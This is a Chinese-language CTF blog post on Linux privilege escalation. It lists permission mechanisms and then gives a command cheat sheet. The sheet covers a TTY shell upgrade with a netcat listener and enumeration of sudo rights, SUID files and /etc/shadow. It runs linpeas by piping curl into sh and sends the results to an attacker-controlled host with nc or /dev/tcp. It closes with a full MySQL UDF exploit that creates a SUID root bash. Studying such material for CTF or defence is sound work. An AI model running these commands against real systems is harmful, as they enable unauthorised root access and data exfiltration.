---
title: Linux提权原理
date: 2025-07-02 16:20:24
description: Linux提权
tags:
- Linux
- Privillege Escalation
categories:
- CTF
---

## 权限体系

### 常用体系

1. **ugo-rwx**
2. **s位suid，sgid**
3. **Capabilities 权限能力**
4. **Appamor，Selinux** //基于文件名、路径的权限，强制访问控制
5. **ACL**（访问控制列表）

### 非常用体系

6. Grsecurity
7. Pax
8. ExecShield
9. ASLR
10. TOMOYO Linux
11. SMACK
12. Yama
13. CGroups
14. Linux Namespaces
15. StackGuard
16. Propolice
17. Seccomp
18. ptrace
19. capsicum
20. Mprotect
21. chroot
22. firejail

---

## 建立交互性强的终端shell

```bash
python -c "import pty;pty.spawn('/bin/bash')"
stty raw -echo
export TERM=xterm[-color]
rlwrap nc -lvnp 4444 # rlwrap可以使用pgup/pgdown功能
```

---

## 枚举 Enumeration

### 手工枚举（高优先）

1. 查看用户基本信息
`whoami，id，who，w #当前用户详细情况，last`
2. 查看内核情况
`uname -a，lsb\_release -a，cat /proc/version，cat /etc/issue`
3. 查看网络情况
`hostnamectl，ip addr | ifconfig(declared)，ip route，ip neigh\[bour\]，arp -a，hostname`
4. 查看权限情况
`sudo -l，getcap -r / 2>/dev/null，find / -perm -u=s -type f 2>/dev/null`
5. 查看文件操作情况
`history，cat /passwd; ls -liah /etc/shadow`
6. 查看定时任务
`cat /etc/crontab ; cat /etc/cron.d/*`
7. 查看环境变量
`echo $PATH ; env`
8. 查看进程
`ps -ef [aux] [axjf]`
9. 查看端口情况
`netstat -[a][t][u][l][s][n][o]`
10. 查看可使用脚本
`which awk perl python ruby gcc vi vim nmap find netcat nc wget curl tftp ftp tmux screen 2>/dev/null`
11. 查看磁盘挂载情况
`cat /etc/fstab`

### 自动枚举工具

1. **Linpeas(PEASS-ng)**

    ```bash
    # 基础使用方法(不建议)
    wget https://github.com/carlospolop/PEASS-ng/releases/download/20230625-4d3aaa66/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    
    # 免下载运行(建议方法)
    curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20230625-4d3aaa66/linpeas.sh | sh
    
    # 无网络情况
    ## kali下载后开启http.server,目标机器使用curl下载运行
    
    # 目标扫描结果传回kali
    ## kali
    python -m http.server
    sudo nc -lvnp lport | tee linpeas.txt
    ## 目标机器
    curl ka.li.linux.ip/linpeas.sh | sh | nc ka.li.linux.ip lport
    ## kali读取linpeas.txt
    less -r linpeas.txt
    
    # 目标机器无法使用curl的情况
    ## kali
    sudo nc -lvnp lport < linpeas.sh
    ## target
    cat < /dev/tcp/ka.li.linux.ip/lport | sh
    ```
2. [LinEnum](https://github.com/rebootuser/LinEnum)
3. [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
4. [linux-exploit-suggester](https://github.com/jondonas/linux-exploit-suggester-2)
5. [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

---

## 服务漏洞利用提权

### Mysql-UDF提权(User Defined Fuction)

#### 利用条件

1. 有mysql数据库账号，拥有CRUD权限
2. MYSQL数据库secure_file_priv=''

#### 利用方法

1. 生成链接文件
	```bash
	$ searchsploit mysql udf
	$ searchsploit mysql udf -m 1518
	
	# 将raptor_udf2.c传到目标服务器上编译
	$ gcc -g -c raptor_udf2.c -fPIC 
	$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	```
2. mysql提权
	```mysql
	show variables like '%secure_file_priv%';
	show variables like '%plugin%'; # 查询结果为$plugin_dir
	use mysql;
	create table foo(line blob);
	insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
	select * from foo into dumpfile '$plugin_dir/raptor_udf2.so';
	create function do_system returns integer soname 'raptor_udf2.so';
	select * from mysql.func;
	select do_system('cp /usr/bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	```
	```bash
	/tmp/rootbash -p
	```
